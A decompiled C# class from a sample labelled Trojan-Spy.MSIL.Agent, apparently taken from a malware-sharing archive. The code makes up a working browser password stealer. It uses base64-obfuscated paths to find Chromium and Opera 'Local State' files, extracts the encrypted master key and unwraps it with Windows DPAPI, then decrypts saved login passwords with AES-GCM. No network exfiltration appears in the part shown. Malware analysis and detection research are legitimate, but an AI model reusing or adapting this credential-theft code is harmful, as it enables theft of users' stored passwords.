// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.Magazonch.Crypto
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace AlphaCentavr.Magazonch
{
  internal sealed class Crypto
  {
    private static string sPrevBrowserPath = "";
    private static byte[] sPrevMasterKey = new byte[0];

    [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptUnprotectData(
      ref Crypto.DataBlob pCipherText,
      ref string pszDescription,
      ref Crypto.DataBlob pEntropy,
      IntPtr pReserved,
      ref Crypto.CryptprotectPromptstruct pPrompt,
      int dwFlags,
      ref Crypto.DataBlob pPlainText);

    public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
    {
      Crypto.DataBlob pPlainText = new Crypto.DataBlob();
      Crypto.DataBlob pCipherText = new Crypto.DataBlob();
      Crypto.DataBlob pEntropy = new Crypto.DataBlob();
      Crypto.CryptprotectPromptstruct pPrompt = new Crypto.CryptprotectPromptstruct()
      {
        cbSize = Marshal.SizeOf(typeof (Crypto.CryptprotectPromptstruct)),
        dwPromptFlags = 0,
        hwndApp = IntPtr.Zero,
        szPrompt = (string) null
      };
      string empty = string.Empty;
      try
      {
        try
        {
          if (bCipher == null)
            bCipher = new byte[0];
          pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
          pCipherText.cbData = bCipher.Length;
          Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);
        }
        catch
        {
        }
        try
        {
          if (bEntropy == null)
            bEntropy = new byte[0];
          pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
          pEntropy.cbData = bEntropy.Length;
          Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);
        }
        catch
        {
        }
        Crypto.CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
        byte[] destination = new byte[pPlainText.cbData];
        Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
        return destination;
      }
      catch
      {
      }
      finally
      {
        if (pPlainText.pbData != IntPtr.Zero)
          Marshal.FreeHGlobal(pPlainText.pbData);
        if (pCipherText.pbData != IntPtr.Zero)
          Marshal.FreeHGlobal(pCipherText.pbData);
        if (pEntropy.pbData != IntPtr.Zero)
          Marshal.FreeHGlobal(pEntropy.pbData);
      }
      return new byte[0];
    }

    private static string bayshkibay(string kiasaalisa) => Encoding.ASCII.GetString(Convert.FromBase64String(kiasaalisa));

    public static byte[] GetMasterKey(string sLocalStateFolder)
    {
      string str = sLocalStateFolder;
      string path = !str.Contains(Crypto.bayshkibay("T3BlcmE=")) ? str + Crypto.bayshkibay("XFxMb2NhbCBTdGF0ZQ==") : str + Crypto.bayshkibay("XFxPcGVyYSBTdGFibGVcXExvY2FsIFN0YXRl");
      byte[] sourceArray = new byte[0];
      if (!File.Exists(path))
        return (byte[]) null;
      if (!(path != Crypto.sPrevBrowserPath))
        return Crypto.sPrevMasterKey;
      Crypto.sPrevBrowserPath = path;
      foreach (Match match in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path)))
      {
        if (match.Success)
          sourceArray = Convert.FromBase64String(match.Groups[1].Value);
      }
      byte[] numArray = new byte[checked (sourceArray.Length - 5)];
      Array.Copy((Array) sourceArray, 5, (Array) numArray, 0, checked (sourceArray.Length - 5));
      try
      {
        Crypto.sPrevMasterKey = Crypto.DPAPIDecrypt(numArray);
        return Crypto.sPrevMasterKey;
      }
      catch
      {
        return (byte[]) null;
      }
    }

    public static string GetUTF8(string sNonUtf8)
    {
      try
      {
        return Encoding.UTF8.GetString(Encoding.Default.GetBytes(sNonUtf8));
      }
      catch
      {
        return sNonUtf8;
      }
    }

    public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
    {
      byte[] numArray1 = new byte[12];
      Array.Copy((Array) bEncryptedData, 3, (Array) numArray1, 0, 12);
      try
      {
        byte[] numArray2 = new byte[checked (bEncryptedData.Length - 15)];
        Array.Copy((Array) bEncryptedData, 15, (Array) numArray2, 0, checked (bEncryptedData.Length - 15));
        byte[] numArray3 = new byte[16];
        byte[] numArray4 = new byte[checked (numArray2.Length - numArray3.Length)];
        Array.Copy((Array) numArray2, checked (numArray2.Length - 16), (Array) numArray3, 0, 16);
        Array.Copy((Array) numArray2, 0, (Array) numArray4, 0, checked (numArray2.Length - numArray3.Length));
        return new yytuutyuuuuuuuuuu().Decrypt(bMasterKey, numArray1, (byte[]) null, numArray4, numArray3);
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
        return (byte[]) null;
      }
    }

    public static string EasyDecrypt(string sLoginData, string odrowssap)
    {
      if (!odrowssap.StartsWith("v10") && !odrowssap.StartsWith("v11"))
        return Encoding.Default.GetString(Crypto.DPAPIDecrypt(Encoding.Default.GetBytes(odrowssap)));
      byte[] masterKey = Crypto.GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
      return Encoding.Default.GetString(Crypto.DecryptWithKey(Encoding.Default.GetBytes(odrowssap), masterKey));
    }

    public static string BrowserPathToAppName(string sLoginData)
    {
      if (sLoginData.Contains("Opera"))
        return "Opera";
      sLoginData.Replace(Pdatdhs.lapiiiiiiiipdaiiiiiiiiiiiiiiiita, "");
      return sLoginData.Split('\\')[1];
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct CryptprotectPromptstruct
    {
      public int cbSize;
      public int dwPromptFlags;
      public IntPtr hwndApp;
      public string szPrompt;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct DataBlob
    {
      public int cbData;
      public IntPtr pbData;
    }
  }
}
